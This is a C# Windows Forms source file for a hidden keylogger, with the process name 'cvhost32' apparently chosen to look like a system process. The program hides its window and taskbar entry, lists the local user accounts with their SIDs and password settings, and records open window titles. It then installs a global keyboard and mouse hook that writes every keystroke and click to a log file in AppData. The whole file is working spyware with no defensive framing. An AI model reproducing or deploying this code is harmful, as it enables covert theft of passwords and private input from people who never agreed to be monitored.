using Gma.System.MouseKeyHook;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Windows.Forms;

namespace cvhost32
{
    public partial class frmMain : Form
    {
        public frmMain()
        {
            InitializeComponent();
            this.ShowInTaskbar = false;
            this.Hide();
            this.WindowState = FormWindowState.Minimized;
            File.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\catchme.log", String.Empty);
            File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\catchme.log", "WINDOWS USERS"+Environment.NewLine);
            File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\catchme.log", "---------------------------------------------------------------" + Environment.NewLine);        
            ManagementObjectSearcher usersSearcher = new ManagementObjectSearcher(@"SELECT * FROM Win32_UserAccount");
            ManagementObjectCollection users = usersSearcher.Get();

            var localUsers = users.Cast<ManagementObject>().Where(
                u => (bool)u["LocalAccount"] == true &&
                     (bool)u["Disabled"] == false &&
                     (bool)u["Lockout"] == false &&
                     int.Parse(u["SIDType"].ToString()) == 1 &&
                     u["Name"].ToString() != "HomeGroupUser$");

            foreach (ManagementObject user in localUsers)
            {
                File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\catchme.log", "Account Type: " + user["AccountType"].ToString() + Environment.NewLine);
                File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\catchme.log", "Caption: " + user["Caption"].ToString() + Environment.NewLine);
                File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\catchme.log", "Description: " + user["Description"].ToString() + Environment.NewLine);
                File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\catchme.log", "Disabled: " + user["Disabled"].ToString() + Environment.NewLine);
                File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\catchme.log", "Domain: " + user["Domain"].ToString() + Environment.NewLine);
                File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\catchme.log", "Full Name: " + user["FullName"].ToString() + Environment.NewLine);
                File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\catchme.log", "Local Account: " + user["LocalAccount"].ToString() + Environment.NewLine);
                File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\catchme.log", "Lockout: " + user["Lockout"].ToString() + Environment.NewLine);
                File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\catchme.log", "Name: " + user["Name"].ToString());
                File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\catchme.log", "Password Changeable: " + user["PasswordChangeable"].ToString() + Environment.NewLine);
                File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\catchme.log", "Password Expires: " + user["PasswordExpires"].ToString() + Environment.NewLine);
                File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\catchme.log", "Password Required: " + user["PasswordRequired"].ToString() + Environment.NewLine);
                File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\catchme.log", "SID: " + user["SID"].ToString() + Environment.NewLine);
                File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\catchme.log", "SID Type: " + user["SIDType"].ToString() + Environment.NewLine);
                File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\catchme.log", "Status: " + user["Status"].ToString() + Environment.NewLine+Environment.NewLine);
            }
            File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\catchme.log", "PROCESSES"+Environment.NewLine);
            File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\catchme.log", "---------------------------------------------------------------" + Environment.NewLine);

            Process[] processes = Process.GetProcesses();
            foreach (Process p in processes)
            {
                if (!String.IsNullOrEmpty(p.MainWindowTitle))
                {
                    File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\catchme.log", p.MainWindowTitle + Environment.NewLine);
                }
            }
            File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\catchme.log",  Environment.NewLine);


            File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\catchme.log", "PRESSED KEYS" + Environment.NewLine);
            File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\catchme.log", "---------------------------------------------------------------" + Environment.NewLine);
            Subscribe();
            
        }
        private IKeyboardMouseEvents m_GlobalHook;
        private void addNewKeyPress(char key)
        {
            File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\catchme.log", key.ToString());
        }
        public void Subscribe()
        {
            // Note: for the application hook, use the Hook.AppEvents() instead
            m_GlobalHook = Hook.GlobalEvents();
            m_GlobalHook.MouseDownExt += GlobalHookMouseDownExt;
           // m_GlobalHook.MouseDownExt += GlobalHookMouseDownExt;
            m_GlobalHook.KeyPress += GlobalHookKeyPress;
        }

        private void GlobalHookKeyPress(object sender, KeyPressEventArgs e)
        {
            addNewKeyPress(e.KeyChar);         
        }

        private void GlobalHookMouseDownExt(object sender, MouseEventExtArgs e)
        {
            File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\catchme.log",
                e.Button.ToString());

            // uncommenting the following line will suppress the middle mouse button click
            // if (e.Buttons == MouseButtons.Middle) { e.Handled = true; }
        }

        public void Unsubscribe()
        {
            m_GlobalHook.MouseDownExt -= GlobalHookMouseDownExt;
            m_GlobalHook.KeyPress -= GlobalHookKeyPress;

            //It is recommened to dispose it
            m_GlobalHook.Dispose();
        }
    }
}
